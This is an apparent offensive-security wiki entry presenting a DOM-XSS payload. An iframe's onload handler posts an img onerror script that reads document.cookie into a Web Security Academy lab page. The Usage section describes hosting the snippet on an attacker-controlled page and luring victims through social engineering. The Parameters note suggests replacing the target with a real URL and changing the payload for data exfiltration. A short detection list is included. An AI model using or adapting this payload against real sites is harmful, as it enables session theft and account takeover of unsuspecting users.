---
id: 58e4ed6f-859f-4be5-9856-d5f3aa43e2d1
type: code
language: HTML
verified: true
created_at: '2020-08-06T16:25:31.625090+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - dom-xss
  - payload
  - postmessage
validated: true
---

# Iframe-Onload-PostMessage-DOM-XSS-Payload

## Code

```html
<iframe src="https://acd21f091e0ad0d180d025af006000ee.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">
```

## Description

This HTML code snippet creates an iframe that loads a target URL and, upon loading (onload event), sends a postMessage to the iframe's contentWindow with a malicious payload. The payload is an img tag with an onerror handler that alerts the document cookies, exploiting DOM XSS if the target's message event listener lacks origin validation. The '*' wildcard allows messaging from any origin, increasing the attack's reach.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| src | The URL of the vulnerable target application | https://target-app.com |

Note: Replace the src attribute with the actual target URL before use. The payload in postMessage ('<img src=1 onerror=alert(document.cookie)>') can be customized for different effects, such as data exfiltration.

## Usage

Embed this snippet in an attacker-controlled HTML page and deliver the page URL to the victim via social engineering. When the victim loads the page, the iframe triggers the postMessage, injecting the XSS payload into the target's context. Ideal for exploiting web apps using unvalidated postMessage for cross-origin communication.

## Detection

- Browser developer tools showing unexpected postMessage events from untrusted origins.
- CSP violations or console errors from invalid message processing.
- Monitoring for onload events on iframes loading trusted domains from malicious pages.
- Web application firewalls (WAFs) alerting on suspicious postMessage payloads containing script tags or onerror handlers.

## Related

- [[procedures/Exploit-DOM-XSS-via-Web-Messages-in-Event-Listeners]]
